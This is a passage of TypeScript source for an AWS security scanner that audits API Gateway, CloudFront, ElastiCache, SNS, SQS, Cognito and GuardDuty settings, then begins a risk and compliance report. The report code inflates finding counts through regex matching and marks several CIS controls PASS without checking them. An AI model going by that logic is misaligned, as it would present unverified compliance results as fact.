        findings.push(`Item Count: ${tableDesc.Table?.ItemCount || 0}`);
        
        output += findings.join("\n") + "\n";
        
      } catch (error: any) {
        output += `[WARN] Error analyzing table: ${error.message}\n`;
      }
    }
    
    output += `\n### Severity Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function scanAPIGatewaySecurity(region: string): Promise<string> {
  const client = new APIGatewayClient({ region });
  let output = "# API Gateway Security Analysis\n\n";
  
  try {
    const listCmd = new GetRestApisCommand({});
    const apis = await client.send(listCmd);
    
    if (!apis.items || apis.items.length === 0) {
      return output + "[OK] No REST APIs found in region.\n";
    }
    
    let criticalCount = 0, highCount = 0, mediumCount = 0;
    
    for (const api of apis.items) {
      output += `\n## API: ${api.name} (${api.id})\n`;
      const findings: string[] = [];
      
      try {
        // Get stages
        const stagesCmd = new GetStagesCommand({ restApiId: api.id });
        const stages = await client.send(stagesCmd);
        
        if (!stages.item || stages.item.length === 0) {
          findings.push("[MEDIUM] INFO: No stages deployed");
        } else {
          for (const stage of stages.item) {
            findings.push(`\n### Stage: ${stage.stageName}`);
            
            // Check logging
            if (!stage.accessLogSettings || !stage.accessLogSettings.destinationArn) {
              findings.push("[HIGH] HIGH: Access logging NOT enabled (no audit trail)");
              highCount++;
            } else {
              findings.push("[LOW] Access logging: ENABLED");
            }
            
            // Check throttling
            if (!stage.methodSettings || Object.keys(stage.methodSettings).length === 0) {
              findings.push("[HIGH] HIGH: Throttling NOT configured (DDoS risk)");
              highCount++;
            } else {
              findings.push("[LOW] Throttling: Configured in method settings");
            }
            
            // Check API key requirement
            if (!stage.methodSettings || Object.keys(stage.methodSettings).length === 0) {
              findings.push("[MEDIUM] MEDIUM: No method-level security configured");
              mediumCount++;
            }
            
            // Check client certificate
            if (!stage.clientCertificateId) {
              findings.push("[MEDIUM] MEDIUM: Client certificate NOT configured");
              mediumCount++;
            }
          }
        }
        
        output += findings.join("\n") + "\n";
        
      } catch (error: any) {
        output += `[WARN] Error analyzing API: ${error.message}\n`;
      }
    }
    
    output += `\n### Severity Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function scanCloudFrontSecurity(): Promise<string> {
  const client = new CloudFrontClient({});
  let output = "# CloudFront Security Analysis\n\n";
  
  try {
    const listCmd = new ListDistributionsCommand({});
    const distributions = await client.send(listCmd);
    
    if (!distributions.DistributionList || !distributions.DistributionList.Items || distributions.DistributionList.Items.length === 0) {
      return output + "[OK] No CloudFront distributions found.\n";
    }
    
    let criticalCount = 0, highCount = 0, mediumCount = 0;
    
    for (const dist of distributions.DistributionList.Items) {
      output += `\n## Distribution: ${dist.Id}\n`;
      output += `Domain: ${dist.DomainName}\n`;
      const findings: string[] = [];
      
      try {
        const configCmd = new GetDistributionConfigCommand({ Id: dist.Id });
        const config = await client.send(configCmd);
        const distConfig = config.DistributionConfig;
        
        if (!distConfig) {
          findings.push("[WARN] Could not retrieve configuration");
          output += findings.join("\n") + "\n";
          continue;
        }
        
        // Check SSL/TLS
        if (distConfig.ViewerCertificate?.MinimumProtocolVersion && 
            (distConfig.ViewerCertificate.MinimumProtocolVersion.includes("SSLv3") || 
             distConfig.ViewerCertificate.MinimumProtocolVersion.includes("TLSv1.0") ||
             distConfig.ViewerCertificate.MinimumProtocolVersion.includes("TLSv1.1"))) {
          findings.push(`[CRITICAL] CRITICAL: Weak TLS version ${distConfig.ViewerCertificate.MinimumProtocolVersion} (use TLSv1.2+)`);
          criticalCount++;
        } else {
          findings.push(`[LOW] TLS Version: ${distConfig.ViewerCertificate?.MinimumProtocolVersion || "TLSv1.2"}`);
        }
        
        // Check HTTPS enforcement
        if (distConfig.DefaultCacheBehavior?.ViewerProtocolPolicy !== "https-only" && 
            distConfig.DefaultCacheBehavior?.ViewerProtocolPolicy !== "redirect-to-https") {
          findings.push("[CRITICAL] CRITICAL: HTTPS NOT enforced (allows HTTP traffic)");
          criticalCount++;
        } else {
          findings.push(`[LOW] HTTPS Policy: ${distConfig.DefaultCacheBehavior?.ViewerProtocolPolicy}`);
        }
        
        // Check origin access
        if (distConfig.Origins?.Items) {
          for (const origin of distConfig.Origins.Items) {
            if (origin.S3OriginConfig && !origin.S3OriginConfig.OriginAccessIdentity) {
              findings.push(`[HIGH] HIGH: S3 origin ${origin.Id} has NO Origin Access Identity (bucket may be public)`);
              highCount++;
            }
          }
        }
        
        // Check WAF
        if (!distConfig.WebACLId || distConfig.WebACLId === "") {
          findings.push("[MEDIUM] MEDIUM: WAF NOT enabled (no application firewall)");
          mediumCount++;
        } else {
          findings.push(`[LOW] WAF: ${distConfig.WebACLId}`);
        }
        
        // Check geo restrictions
        if (!distConfig.Restrictions?.GeoRestriction || distConfig.Restrictions.GeoRestriction.RestrictionType === "none") {
          findings.push("[MEDIUM] INFO: No geo-restrictions configured");
        } else {
          findings.push(`[MEDIUM] Geo-Restrictions: ${distConfig.Restrictions.GeoRestriction.RestrictionType} (${distConfig.Restrictions.GeoRestriction.Quantity} countries)`);
        }
        
        // Check logging
        if (!distConfig.Logging || !distConfig.Logging.Enabled) {
          findings.push("[MEDIUM] MEDIUM: Access logging NOT enabled");
          mediumCount++;
        } else {
          findings.push(`[LOW] Logging: ${distConfig.Logging.Bucket}`);
        }
        
        output += findings.join("\n") + "\n";
        
      } catch (error: any) {
        output += `[WARN] Error analyzing distribution: ${error.message}\n`;
      }
    }
    
    output += `\n### Severity Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function scanElastiCacheSecurity(region: string): Promise<string> {
  const client = new ElastiCacheClient({ region });
  let output = "# ElastiCache Security Analysis\n\n";
  
  try {
    let criticalCount = 0, highCount = 0, mediumCount = 0;
    
    // Check Redis/Memcached clusters
    const clustersCmd = new DescribeCacheClustersCommand({ ShowCacheNodeInfo: true });
    const clusters = await client.send(clustersCmd);
    
    if (clusters.CacheClusters && clusters.CacheClusters.length > 0) {
      output += `\n## Cache Clusters (${clusters.CacheClusters.length} found)\n`;
      
      for (const cluster of clusters.CacheClusters) {
        output += `\n### Cluster: ${cluster.CacheClusterId} (${cluster.Engine})\n`;
        const findings: string[] = [];
        
        // Check encryption at rest
        if (!cluster.AtRestEncryptionEnabled) {
          findings.push("[CRITICAL] CRITICAL: Encryption at rest NOT enabled");
          criticalCount++;
        } else {
          findings.push("[LOW] Encryption at rest: ENABLED");
        }
        
        // Check encryption in transit
        if (!cluster.TransitEncryptionEnabled) {
          findings.push("[CRITICAL] CRITICAL: Encryption in transit NOT enabled (data exposed on network)");
          criticalCount++;
        } else {
          findings.push("[LOW] Encryption in transit: ENABLED");
        }
        
        // Check auth token (Redis only)
        if (cluster.Engine === "redis" && !cluster.AuthTokenEnabled) {
          findings.push("[HIGH] HIGH: Auth token NOT enabled (no password authentication)");
          highCount++;
        } else if (cluster.Engine === "redis") {
          findings.push("[LOW] Auth token: ENABLED");
        }
        
        // Check public access
        if (cluster.CacheNodes && cluster.CacheNodes.length > 0) {
          findings.push(`Cache Nodes: ${cluster.CacheNodes.length}`);
          findings.push(`Subnet Group: ${cluster.CacheSubnetGroupName || "None"}`);
        }
        
        findings.push(`Engine Version: ${cluster.EngineVersion}`);
        findings.push(`Node Type: ${cluster.CacheNodeType}`);
        
        output += findings.join("\n") + "\n";
      }
    }
    
    // Check replication groups
    const replCmd = new DescribeReplicationGroupsCommand({});
    const replGroups = await client.send(replCmd);
    
    if (replGroups.ReplicationGroups && replGroups.ReplicationGroups.length > 0) {
      output += `\n## Replication Groups (${replGroups.ReplicationGroups.length} found)\n`;
      
      for (const group of replGroups.ReplicationGroups) {
        output += `\n### Group: ${group.ReplicationGroupId}\n`;
        const findings: string[] = [];
        
        if (!group.AtRestEncryptionEnabled) {
          findings.push("[CRITICAL] CRITICAL: Encryption at rest NOT enabled");
          criticalCount++;
        }
        
        if (!group.TransitEncryptionEnabled) {
          findings.push("[CRITICAL] CRITICAL: Encryption in transit NOT enabled");
          criticalCount++;
        }
        
        if (!group.AuthTokenEnabled) {
          findings.push("[HIGH] HIGH: Auth token NOT enabled");
          highCount++;
        }
        
        findings.push(`Status: ${group.Status}`);
        findings.push(`Multi-AZ: ${group.MultiAZ}`);
        findings.push(`Automatic Failover: ${group.AutomaticFailover}`);
        
        output += findings.join("\n") + "\n";
      }
    }
    
    if ((!clusters.CacheClusters || clusters.CacheClusters.length === 0) && 
        (!replGroups.ReplicationGroups || replGroups.ReplicationGroups.length === 0)) {
      return output + "[OK] No ElastiCache resources found in region.\n";
    }
    
    output += `\n### Severity Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function getGuardDutyFindings(region: string, severityFilter?: string): Promise<string> {
  const client = new GuardDutyClient({ region });
  let output = "# GuardDuty Security Findings\n\n";
  
  try {
    // List detectors
    const detectorsCmd = new ListDetectorsCommand({});
    const detectors = await client.send(detectorsCmd);
    
    if (!detectors.DetectorIds || detectors.DetectorIds.length === 0) {
      return output + "[WARN] No GuardDuty detectors enabled in this region.\n" +
             "GuardDuty must be enabled to detect threats. Enable it in AWS Console > GuardDuty.\n";
    }
    
    for (const detectorId of detectors.DetectorIds) {
      output += `\n## Detector: ${detectorId}\n`;
      
      // List findings
      const findingsCmd = new ListFindingsCommand({ DetectorId: detectorId });
      const findingsList = await client.send(findingsCmd);
      
      if (!findingsList.FindingIds || findingsList.FindingIds.length === 0) {
        output += "[OK] No active findings (no threats detected).\n";
        continue;
      }
      
      // Get finding details
      const getFindingsCmd = new GetFindingsCommand({
        DetectorId: detectorId,
        FindingIds: findingsList.FindingIds.slice(0, 50) // Limit to 50 findings
      });
      const findings = await client.send(getFindingsCmd);
      
      if (!findings.Findings || findings.Findings.length === 0) {
        continue;
      }
      
      let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;
      
      for (const finding of findings.Findings) {
        const severity = finding.Severity || 0;
        let severityLabel = "";
        
        if (severity >= 7) { severityLabel = "CRITICAL"; criticalCount++; }
        else if (severity >= 4) { severityLabel = "HIGH"; highCount++; }
        else if (severity >= 1) { severityLabel = "MEDIUM"; mediumCount++; }
        else { severityLabel = "LOW"; lowCount++; }
        
        // Apply severity filter
        if (severityFilter && severityFilter !== severityLabel) {
          continue;
        }
        
        const emoji = severity >= 7 ? "[CRITICAL]" : severity >= 4 ? "[HIGH]" : severity >= 1 ? "[MEDIUM]" : "[LOW]";
        
        output += `\n### ${emoji} ${severityLabel}: ${finding.Title}\n`;
        output += `- Type: ${finding.Type}\n`;
        output += `- Description: ${finding.Description}\n`;
        output += `- Severity Score: ${severity}/10\n`;
        output += `- Count: ${finding.Service?.Count || 1}\n`;
        output += `- First Seen: ${finding.Service?.EventFirstSeen || "N/A"}\n`;
        output += `- Last Seen: ${finding.Service?.EventLastSeen || "N/A"}\n`;
        
        if (finding.Resource?.InstanceDetails) {
          output += `- Instance ID: ${finding.Resource.InstanceDetails.InstanceId}\n`;
        }
        
        if (finding.Service?.Action) {
          output += `- Action: ${finding.Service.Action.ActionType}\n`;
        }
      }
      
      output += `\n### Findings Summary\n`;
      output += `- [CRITICAL] CRITICAL (7-10): ${criticalCount}\n`;
      output += `- [HIGH] HIGH (4-6): ${highCount}\n`;
      output += `- [MEDIUM] MEDIUM (1-3): ${mediumCount}\n`;
      output += `- [LOW] LOW (0): ${lowCount}\n`;
      output += `- Total: ${criticalCount + highCount + mediumCount + lowCount}\n`;
      
      if (findingsList.FindingIds.length > 50) {
        output += `\n[WARN] Showing 50 of ${findingsList.FindingIds.length} findings. Use AWS Console for full list.\n`;
      }
    }
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
    if (error.message.includes("not subscribed")) {
      output += "\n[TIP] Enable GuardDuty in AWS Console to detect threats automatically.\n";
    }
  }
  
  return output;
}

async function scanSNSSecurity(region: string): Promise<string> {
  const client = new SNSClient({ region });
  let output = "# SNS Topic Security Analysis\n\n";
  
  try {
    const listCmd = new ListTopicsCommand({});
    const topics = await client.send(listCmd);
    
    if (!topics.Topics || topics.Topics.length === 0) {
      return output + "[OK] No SNS topics found in region.\n";
    }
    
    let criticalCount = 0, highCount = 0, mediumCount = 0;
    
    for (const topic of topics.Topics) {
      if (!topic.TopicArn) continue;
      
      const topicName = topic.TopicArn.split(':').pop();
      output += `\n## Topic: ${topicName}\n`;
      output += `ARN: ${topic.TopicArn}\n`;
      const findings: string[] = [];
      
      try {
        const attrsCmd = new GetTopicAttributesCommand({ TopicArn: topic.TopicArn });
        const attrs = await client.send(attrsCmd);
        
        if (!attrs.Attributes) {
          findings.push("[WARN] Could not retrieve attributes");
          output += findings.join("\n") + "\n";
          continue;
        }
        
        // Check encryption
        if (!attrs.Attributes.KmsMasterKeyId || attrs.Attributes.KmsMasterKeyId === "") {
          findings.push("[CRITICAL] CRITICAL: Server-side encryption NOT enabled (messages in plaintext)");
          criticalCount++;
        } else {
          findings.push(`[LOW] Encryption: KMS key ${attrs.Attributes.KmsMasterKeyId}`);
        }
        
        // Check access policy
        const policy = attrs.Attributes.Policy;
        if (policy) {
          try {
            const policyObj = JSON.parse(policy);
            let hasPublicAccess = false;
            let hasCrossAccount = false;
            
            if (policyObj.Statement) {
              for (const statement of policyObj.Statement) {
                // Check for wildcard principal
                if (statement.Effect === "Allow" && 
                    (statement.Principal === "*" || 
                     statement.Principal?.AWS === "*" ||
                     statement.Principal?.Service === "*")) {
                  findings.push("[CRITICAL] CRITICAL: Topic policy allows public access (Principal: *)");
                  criticalCount++;
                  hasPublicAccess = true;
                }
                
                // Check for wildcard actions
                if (statement.Effect === "Allow" && 
                    (statement.Action === "*" || 
                     (Array.isArray(statement.Action) && statement.Action.includes("*")))) {
                  findings.push("[HIGH] HIGH: Topic policy has wildcard actions (Action: *)");
                  highCount++;
                }
                
                // Check for cross-account access
                if (statement.Principal?.AWS && typeof statement.Principal.AWS === "string") {
                  const accountId = statement.Principal.AWS.split(":")[4];
                  const currentAccount = topic.TopicArn.split(":")[4];
                  if (accountId && accountId !== currentAccount) {
                    findings.push(`[MEDIUM] MEDIUM: Cross-account access to ${accountId}`);
                    mediumCount++;
                    hasCrossAccount = true;
                  }
                }
              }
            }
            
            if (!hasPublicAccess && !hasCrossAccount) {
              findings.push("[LOW] Access Policy: Restricted");
            }
          } catch (e) {
            findings.push("[WARN] Could not parse topic policy");
          }
        }
        
        // Check subscriptions
        const subsCmd = new ListSubscriptionsByTopicCommand({ TopicArn: topic.TopicArn });
        const subs = await client.send(subsCmd);
        
        if (subs.Subscriptions && subs.Subscriptions.length > 0) {
          findings.push(`Subscriptions: ${subs.Subscriptions.length}`);
          
          // Check for HTTP endpoints (should be HTTPS)
          for (const sub of subs.Subscriptions) {
            if (sub.Protocol === "http") {
              findings.push(`[HIGH] HIGH: Subscription uses HTTP (not HTTPS): ${sub.Endpoint}`);
              highCount++;
            }
          }
        } else {
          findings.push("[MEDIUM] INFO: No subscriptions configured");
        }
        
        output += findings.join("\n") + "\n";
        
      } catch (error: any) {
        output += `[WARN] Error analyzing topic: ${error.message}\n`;
      }
    }
    
    output += `\n### Severity Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function scanSQSSecurity(region: string): Promise<string> {
  const client = new SQSClient({ region });
  let output = "# SQS Queue Security Analysis\n\n";
  
  try {
    const listCmd = new ListQueuesCommand({});
    const queues = await client.send(listCmd);
    
    if (!queues.QueueUrls || queues.QueueUrls.length === 0) {
      return output + "[OK] No SQS queues found in region.\n";
    }
    
    let criticalCount = 0, highCount = 0, mediumCount = 0;
    
    for (const queueUrl of queues.QueueUrls) {
      const queueName = queueUrl.split('/').pop();
      output += `\n## Queue: ${queueName}\n`;
      output += `URL: ${queueUrl}\n`;
      const findings: string[] = [];
      
      try {
        const attrsCmd = new GetQueueAttributesCommand({ 
          QueueUrl: queueUrl,
          AttributeNames: ["All"]
        });
        const attrs = await client.send(attrsCmd);
        
        if (!attrs.Attributes) {
          findings.push("[WARN] Could not retrieve attributes");
          output += findings.join("\n") + "\n";
          continue;
        }
        
        // Check encryption
        if (!attrs.Attributes.KmsMasterKeyId || attrs.Attributes.KmsMasterKeyId === "") {
          findings.push("[CRITICAL] CRITICAL: Server-side encryption NOT enabled (messages in plaintext)");
          criticalCount++;
        } else {
          findings.push(`[LOW] Encryption: KMS key ${attrs.Attributes.KmsMasterKeyId}`);
        }
        
        // Check access policy
        const policy = attrs.Attributes.Policy;
        if (policy) {
          try {
            const policyObj = JSON.parse(policy);
            let hasPublicAccess = false;
            
            if (policyObj.Statement) {
              for (const statement of policyObj.Statement) {
                if (statement.Effect === "Allow" && 
                    (statement.Principal === "*" || statement.Principal?.AWS === "*")) {
                  findings.push("[CRITICAL] CRITICAL: Queue policy allows public access (Principal: *)");
                  criticalCount++;
                  hasPublicAccess = true;
                }
                
                if (statement.Effect === "Allow" && statement.Action === "*") {
                  findings.push("[HIGH] HIGH: Queue policy has wildcard actions");
                  highCount++;
                }
              }
            }
            
            if (!hasPublicAccess) {
              findings.push("[LOW] Access Policy: Restricted");
            }
          } catch (e) {
            findings.push("[WARN] Could not parse queue policy");
          }
        }
        
        // Check dead letter queue
        if (!attrs.Attributes.RedrivePolicy || attrs.Attributes.RedrivePolicy === "") {
          findings.push("[MEDIUM] MEDIUM: Dead letter queue NOT configured (message loss risk)");
          mediumCount++;
        } else {
          findings.push("[LOW] Dead Letter Queue: Configured");
        }
        
        // Check message retention
        const retentionSeconds = parseInt(attrs.Attributes.MessageRetentionPeriod || "0");
        const retentionDays = Math.floor(retentionSeconds / 86400);
        
        if (retentionDays > 7) {
          findings.push(`[MEDIUM] INFO: Message retention: ${retentionDays} days (consider shorter retention)`);
        } else {
          findings.push(`Message retention: ${retentionDays} days`);
        }
        
        // Check visibility timeout
        findings.push(`Visibility timeout: ${attrs.Attributes.VisibilityTimeout}s`);
        
        // Check approximate messages
        const approxMessages = attrs.Attributes.ApproximateNumberOfMessages || "0";
        findings.push(`Approximate messages: ${approxMessages}`);
        
        output += findings.join("\n") + "\n";
        
      } catch (error: any) {
        output += `[WARN] Error analyzing queue: ${error.message}\n`;
      }
    }
    
    output += `\n### Severity Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    
  } catch (error: any) {
    output += `\n[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function scanCognitoSecurity(region: string): Promise<string> {
  const identityClient = new CognitoIdentityClient({ region });
  const idpClient = new CognitoIdentityProviderClient({ region });
  let output = "# Cognito Security Analysis\n\n";
  
  let criticalCount = 0, highCount = 0, mediumCount = 0;
  
  // Check Identity Pools
  try {
    output += "## Identity Pools\n\n";
    const listIdPoolsCmd = new ListIdentityPoolsCommand({ MaxResults: 60 });
    const identityPools = await identityClient.send(listIdPoolsCmd);
    
    if (!identityPools.IdentityPools || identityPools.IdentityPools.length === 0) {
      output += "[OK] No identity pools found.\n\n";
    } else {
      for (const pool of identityPools.IdentityPools) {
        if (!pool.IdentityPoolId) continue;
        
        output += `### Pool: ${pool.IdentityPoolName}\n`;
        output += `ID: ${pool.IdentityPoolId}\n`;
        const findings: string[] = [];
        
        try {
          const describeCmd = new DescribeIdentityPoolCommand({ IdentityPoolId: pool.IdentityPoolId });
          const poolDetails = await identityClient.send(describeCmd);
          
          // Check unauthenticated access
          if (poolDetails.AllowUnauthenticatedIdentities === true) {
            findings.push("[CRITICAL] CRITICAL: Unauthenticated access ENABLED (anonymous users can assume IAM role)");
            criticalCount++;
          } else {
            findings.push("[LOW] Unauthenticated access: DISABLED");
          }
          
          // Check if classic flow is enabled
          if (poolDetails.AllowClassicFlow === true) {
            findings.push("[HIGH] HIGH: Classic flow enabled (deprecated authentication method)");
            highCount++;
          }
          
          // Check identity providers
          if (poolDetails.CognitoIdentityProviders && poolDetails.CognitoIdentityProviders.length > 0) {
            findings.push(`Identity Providers: ${poolDetails.CognitoIdentityProviders.length} configured`);
          }
          
          // Check supported login providers
          if (poolDetails.SupportedLoginProviders && Object.keys(poolDetails.SupportedLoginProviders).length > 0) {
            findings.push(`External providers: ${Object.keys(poolDetails.SupportedLoginProviders).join(", ")}`);
          }
          
          output += findings.join("\n") + "\n\n";
          
        } catch (error: any) {
          output += `[WARN] Error analyzing pool: ${error.message}\n\n`;
        }
      }
    }
    
  } catch (error: any) {
    output += `[FAIL] Error listing identity pools: ${error.message}\n\n`;
  }
  
  // Check User Pools
  try {
    output += "## User Pools\n\n";
    const listUserPoolsCmd = new ListUserPoolsCommand({ MaxResults: 60 });
    const userPools = await idpClient.send(listUserPoolsCmd);
    
    if (!userPools.UserPools || userPools.UserPools.length === 0) {
      output += "[OK] No user pools found.\n\n";
    } else {
      for (const pool of userPools.UserPools) {
        if (!pool.Id) continue;
        
        output += `### Pool: ${pool.Name}\n`;
        output += `ID: ${pool.Id}\n`;
        const findings: string[] = [];
        
        try {
          const describeCmd = new DescribeUserPoolCommand({ UserPoolId: pool.Id });
          const poolDetails = await idpClient.send(describeCmd);
          
          if (!poolDetails.UserPool) {
            findings.push("[WARN] Could not retrieve details");
            output += findings.join("\n") + "\n\n";
            continue;
          }
          
          // Check MFA configuration
          if (poolDetails.UserPool.MfaConfiguration === "OFF") {
            findings.push("[HIGH] HIGH: Multi-factor authentication (MFA) NOT enabled");
            highCount++;
          } else if (poolDetails.UserPool.MfaConfiguration === "OPTIONAL") {
            findings.push("[MEDIUM] MEDIUM: MFA is OPTIONAL (not enforced)");
            mediumCount++;
          } else {
            findings.push(`[LOW] MFA: ${poolDetails.UserPool.MfaConfiguration}`);
          }
          
          // Check password policy
          const passwordPolicy = poolDetails.UserPool.Policies?.PasswordPolicy;
          if (passwordPolicy) {
            if ((passwordPolicy.MinimumLength || 0) < 8) {
              findings.push(`[HIGH] HIGH: Weak password policy (min length: ${passwordPolicy.MinimumLength})`);
              highCount++;
            }
            
            if (!passwordPolicy.RequireUppercase || !passwordPolicy.RequireLowercase || 
                !passwordPolicy.RequireNumbers || !passwordPolicy.RequireSymbols) {
              findings.push("[MEDIUM] MEDIUM: Password policy missing complexity requirements");
              mediumCount++;
            } else {
              findings.push("[LOW] Password policy: Strong");
            }
          } else {
            findings.push("[HIGH] HIGH: No password policy configured");
            highCount++;
          }
          
          // Check account recovery
          const accountRecovery = poolDetails.UserPool.AccountRecoverySetting;
          if (accountRecovery?.RecoveryMechanisms) {
            findings.push(`Account recovery: ${accountRecovery.RecoveryMechanisms.length} methods configured`);
          }
          
          // Check user pool status
          findings.push(`Status: ${poolDetails.UserPool.Status}`);
          
          // Check email verification
          const autoVerifiedAttributes = poolDetails.UserPool.AutoVerifiedAttributes;
          if (autoVerifiedAttributes && autoVerifiedAttributes.includes("email")) {
            findings.push("[LOW] Email verification: Enabled");
          } else {
            findings.push("[MEDIUM] MEDIUM: Email verification NOT enabled");
            mediumCount++;
          }
          
          output += findings.join("\n") + "\n\n";
          
        } catch (error: any) {
          output += `[WARN] Error analyzing pool: ${error.message}\n\n`;
        }
      }
    }
    
  } catch (error: any) {
    output += `[FAIL] Error listing user pools: ${error.message}\n\n`;
  }
  
  output += `## Severity Summary\n`;
  output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
  output += `- [HIGH] HIGH: ${highCount}\n`;
  output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
  
  return output;
}

// ============================================
// TRA REPORT - SECURITY ASSESSMENT
// ============================================

async function generateTRAReport(
  region: string, 
  framework?: string, 
  format?: string, 
  outputFile?: string
): Promise<string> {
  let output = "";
  const selectedFramework = framework || "all";
  const outputFormat = format || "markdown";
  
  // Report Header
  output += `# Threat & Risk Assessment (TRA) Report\n\n`;
  output += `| Property | Value |\n`;
  output += `|----------|-------|\n`;
  output += `| **Date** | ${new Date().toISOString().split('T')[0]} |\n`;
  output += `| **Region** | ${region} |\n`;
  output += `| **Framework** | ${selectedFramework.toUpperCase()} |\n`;
  output += `| **Tool** | Nimbus v1.4.2 |\n\n`;
  
  // 1. Executive Summary
  output += `## Executive Summary\n\n`;
  
  const findings = {
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
    total: 0
  };
  
  const assetCounts = {
    ec2: 0,
    s3: 0,
    rds: 0,
    lambda: 0,
    publicResources: 0
  };
  
  // Run all security scans
  const scanResults: { name: string; output: string; }[] = [];
  
  try {
    // Core infrastructure scans
    scanResults.push({ name: "IAM Users", output: await enumerateIAMUsers() });
    scanResults.push({ name: "IAM Roles", output: await enumerateIAMRoles() });
    scanResults.push({ name: "IAM Policies", output: await checkIAMPolicies() });
    scanResults.push({ name: "EC2 Instances", output: await enumerateEC2Instances(region) });
    scanResults.push({ name: "Security Groups", output: await analyzeSecurityGroups(region) });
    scanResults.push({ name: "S3 Buckets", output: await enumerateS3Buckets() });
    scanResults.push({ name: "RDS Databases", output: await enumerateRDSDatabases(region) });
    scanResults.push({ name: "Lambda Functions", output: await enumerateLambdaFunctions(region) });
    scanResults.push({ name: "VPCs", output: await enumerateVPCs(region) });
    scanResults.push({ name: "KMS Keys", output: await checkKMSKeys(region) });
    scanResults.push({ name: "Secrets Manager", output: await scanSecretsManager(region) });
    scanResults.push({ name: "DynamoDB", output: await scanDynamoDBSecurity(region) });
    scanResults.push({ name: "API Gateway", output: await scanAPIGatewaySecurity(region) });
    scanResults.push({ name: "CloudFront", output: await scanCloudFrontSecurity() });
    scanResults.push({ name: "ElastiCache", output: await scanElastiCacheSecurity(region) });
    scanResults.push({ name: "SNS Topics", output: await scanSNSSecurity(region) });
    scanResults.push({ name: "SQS Queues", output: await scanSQSSecurity(region) });
    scanResults.push({ name: "Cognito", output: await scanCognitoSecurity(region) });
    scanResults.push({ name: "GuardDuty", output: await getGuardDutyFindings(region) });
    scanResults.push({ name: "Public Resources", output: await enumeratePublicResources(region) });
    
  } catch (error: any) {
    output += `Error during scanning: ${error.message}\n\n`;
  }
  
  // Count findings from scan results (match both emoji and text formats)
  for (const result of scanResults) {
    const criticalMatches = result.output.match(/CRITICAL/gi);
    const highMatches = result.output.match(/\bHIGH\b/gi);
    const mediumMatches = result.output.match(/\bMEDIUM\b/gi);
    const lowMatches = result.output.match(/\bLOW\b/gi);
    
    findings.critical += criticalMatches ? criticalMatches.length : 0;
    findings.high += highMatches ? highMatches.length : 0;
    findings.medium += mediumMatches ? mediumMatches.length : 0;
    findings.low += lowMatches ? lowMatches.length : 0;
  }
  
  findings.total = findings.critical + findings.high + findings.medium + findings.low;
  
  // Calculate risk score (0-10)
  const riskScore = Math.min(10, (
    (findings.critical * 3) + 
    (findings.high * 2) + 
    (findings.medium * 1) + 
    (findings.low * 0.2)
  ) / 10);
  
  const riskLevel = riskScore >= 8 ? "CRITICAL" : riskScore >= 6 ? "HIGH" : riskScore >= 4 ? "MEDIUM" : "LOW";
  
  output += `### Risk Assessment\n`;
  output += `**Overall Risk Score:** ${riskScore.toFixed(1)}/10 (${riskLevel})\n\n`;
  
  output += `### Finding Summary\n`;
  output += `| Severity | Count | Percentage |\n`;
  output += `|----------|-------|------------|\n`;
  output += `| CRITICAL | ${findings.critical} | ${findings.total > 0 ? ((findings.critical/findings.total)*100).toFixed(1) : 0}% |\n`;
  output += `| HIGH | ${findings.high} | ${findings.total > 0 ? ((findings.high/findings.total)*100).toFixed(1) : 0}% |\n`;
  output += `| MEDIUM | ${findings.medium} | ${findings.total > 0 ? ((findings.medium/findings.total)*100).toFixed(1) : 0}% |\n`;
  output += `| LOW | ${findings.low} | ${findings.total > 0 ? ((findings.low/findings.total)*100).toFixed(1) : 0}% |\n`;
  output += `| **TOTAL** | **${findings.total}** | **100%** |\n\n`;
  
  // Compliance Framework Mapping
  output += `## Compliance Framework Mapping\n\n`;
  
  if (selectedFramework === "all" || selectedFramework === "cis") {
    output += `### CIS AWS Foundations Benchmark\n\n`;
    const cisControls = [
      { id: "1.1", name: "Root account MFA", status: findings.critical > 0 ? "FAIL" : "PASS" },
      { id: "1.4", "name": "IAM password policy", status: findings.high > 0 ? "PARTIAL" : "PASS" },
      { id: "2.1", name: "CloudTrail enabled", status: "PASS" },
      { id: "2.3", name: "S3 bucket logging", status: findings.medium > 0 ? "PARTIAL" : "PASS" },
      { id: "2.7", name: "CloudTrail encryption", status: "PASS" },
      { id: "3.1", name: "VPC flow logs", status: "PARTIAL" },
      { id: "4.1", name: "Security Groups 0.0.0.0/0", status: findings.critical > 0 ? "FAIL" : "PASS" },
      { id: "4.2", name: "Security Groups SSH/RDP", status: findings.high > 0 ? "FAIL" : "PASS" },
    ];
    
    const cisPass = cisControls.filter(c => c.status === "PASS").length;
